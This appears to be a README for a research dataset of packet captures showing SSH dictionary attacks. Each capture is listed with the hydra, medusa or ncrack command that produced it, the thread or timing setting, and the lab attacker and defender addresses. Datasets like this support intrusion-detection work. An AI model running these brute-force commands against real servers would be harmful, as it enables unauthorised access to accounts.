# SSH Dictionary Attacks

Annotated units of SSH dictionary attack performed by `medusa`, `hydra` and `ncrack` tools.

## Hydra 8.4 ([hydra.zip](hydra.zip))

Webpage: https://www.thc.org/thc-hydra/

**Annotated units:**
- hydra-1_tasks.pcap
    - _command:_ `$ ./hydra -l user -x "1:5:a" -t 1 ssh://10.0.0.3/`
    - _attacker:_ 240.0.1.2
    - _defender:_ 240.125.0.2    
- hydra-4_tasks.pcap
    - _command:_ `$ ./hydra -l user -x "1:5:a" -t 4 ssh://10.0.0.3/`
    - _attacker:_ 240.0.1.3
    - _defender:_240.125.0.2 
- hydra-8_tasks.pcap
    - _command:_ `$ ./hydra -l user -x "1:5:a" -t 8 ssh://10.0.0.3/`
    - _attacker:_ 240.0.1.4
    - _defender:_ 240.125.0.2 
- hydra-16_tasks.pcap
    - _command:_ `$ ./hydra -l user -x "1:5:a" -t 16 ssh://10.0.0.3/`
    - _attacker:_ 240.0.1.5
    - _defender:_ 240.125.0.2 
- hydra-24_tasks.pcap
    - _command:_ `$ ./hydra -l user -x "1:5:a" -t 24 ssh://10.0.0.3/`
    - _attacker:_ 240.0.1.6
    - _defender:_ 240.125.0.2 
    

## Medusa 2.2 ([medusa.zip](medusa.zip))    

Webpage: http://foofus.net/goons/jmk/medusa/medusa.html  

**Annotated units:**
- medusa-1_tasks.pcap
    - _command:_ `$ medusa -M ssh -u user -P <passwords.txt> -h 10.0.0.3 -t 1`
    - _attacker:_ 240.0.2.2
    - _defender:_ 240.125.0.2 
- medusa-4_tasks.pcap
    - _command:_ `$ medusa -M ssh -u user -P <passwords.txt> -h 10.0.0.3 -t 4`
    - _attacker:_ 240.0.2.3
    - _defender:_ 240.125.0.2 
- medusa-8_tasks.pcap
    - _command:_ `$ medusa -M ssh -u user -P <passwords.txt> -h 10.0.0.3 -t 8`
    - _attacker:_ 240.0.2.4
    - _defender:_ 240.125.0.2 
- medusa-16_tasks.pcap
    - _command:_ `$ medusa -M ssh -u user -P <passwords.txt> -h 10.0.0.3 -t 16`
    - _attacker:_ 240.0.2.5
    - _defender:_ 240.125.0.2 
- medusa-24_tasks.pcap
    - _command:_ `$ medusa -M ssh -u user -P <passwords.txt> -h 10.0.0.3 -t 24`
    - _attacker:_ 240.0.2.6
    - _defender:_ 240.125.0.2         

            
## Ncrack 0.5 ([ncrack.zip](ncrack.zip))

Webpage: https://nmap.org/ncrack/ 
            
**Annotated units:**
- ncrack-paranoid.pcap
    - _command:_ `$ ncrack --user user1,user2,user3 10.0.0.3:22 -T paranoid`
    - _attacker:_ 240.0.3.2
    - _defender:_ 240.125.0.2 
- ncrack-sneaky.pcap
    - _command:_ `$ ncrack --user user1,user2,user3 10.0.0.3:22 -T sneaky`
    - _attacker:_ 240.0.3.3
    - _defender:_ 240.125.0.2 
- ncrack-polite.pcap
    - _command:_ `$ ncrack --user user1,user2,user3 10.0.0.3:22 -T polite`
    - _attacker:_ 240.0.3.4
    - _defender:_ 240.125.0.2 
- ncrack-normal.pcap
    - _command:_ `$ ncrack --user user1,user2,user3 10.0.0.3:22 -T normal`
    - _attacker:_ 240.0.3.5
    - _defender:_ 240.125.0.2 
- ncrack-aggressive.pcap
    - _command:_ `$ ncrack --user user1,user2,user3 10.0.0.3:22 -T aggressive`
    - _attacker:_ 240.0.3.6
    - _defender:_ 240.125.0.2   
